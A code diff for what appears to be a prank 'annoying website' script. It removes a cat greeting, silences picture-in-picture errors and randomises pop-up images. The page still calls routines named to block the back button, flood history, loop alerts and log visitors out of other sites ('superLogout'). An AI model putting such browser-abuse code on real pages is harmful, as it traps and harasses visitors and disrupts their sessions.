@@ -268,7 +268,6 @@ function initChildWindow() {
  * Initialization code for parent windows.
  */
 function initParentWindow() {
-  showHelloMessage()
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
@@ -283,7 +282,6 @@ function initParentWindow() {
       startImages()
       startAlertInterval()
       superLogout()
-      removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
       speak('geg geg geg geg geggy')
@@ -567,13 +565,15 @@ function startInvisiblePictureInPictureVideo() {
  * desktop. Requires user-initiated event.
  */
 function enablePictureInPicture() {
-  const video = document.querySelector('video')
-  if (document.pictureInPictureEnabled) {
-    video.style = ''
-    video.muted = false
-    video.requestPictureInPicture()
-    video.play()
-  }
+  try {
+    const video = document.querySelector('video')
+    if (document.pictureInPictureEnabled) {
+      video.style = ''
+      video.muted = false
+      video.requestPictureInPicture()
+      video.play()
+    }
+  } catch { }
 }
 
 /**
@@ -862,11 +862,12 @@ function startVideo() {
 function startImages() {
   for (let i = 0; i < (isChildWindow ? 3 : 10); i++) {
     const img = document.createElement('img');
-    img.src = '/' + geggyImages[i % geggyImages.length];
+    
+    img.src = getRandomArrayEntry(geggyImages);
     img.style.position = 'absolute';
-
     img.style.top = Math.random() * SCREEN_HEIGHT + 'px';
     img.style.left = Math.random() * SCREEN_WIDTH + 'px';
+
     document.body.appendChild(img);
   }
 }
@@ -887,23 +888,6 @@ function detectWindowClose() {
 function onCloseWindow(win) {
   const i = wins.indexOf(win)
   if (i >= 0) wins.splice(i, 1)
-}
-
-/**
- * Show the unsuspecting user a friendly hello message with a cat.
- */
-function showHelloMessage() {
-  const template = document.querySelector('template')
-  const clone = document.importNode(template.content, true)
-  document.body.appendChild(clone)
-}
-
-/**
- * Remove the hello message.
- */
-function removeHelloMessage() {
-  const helloMessage = document.querySelector('.hello-message')
-  helloMessage.remove()
 }
 
 /**
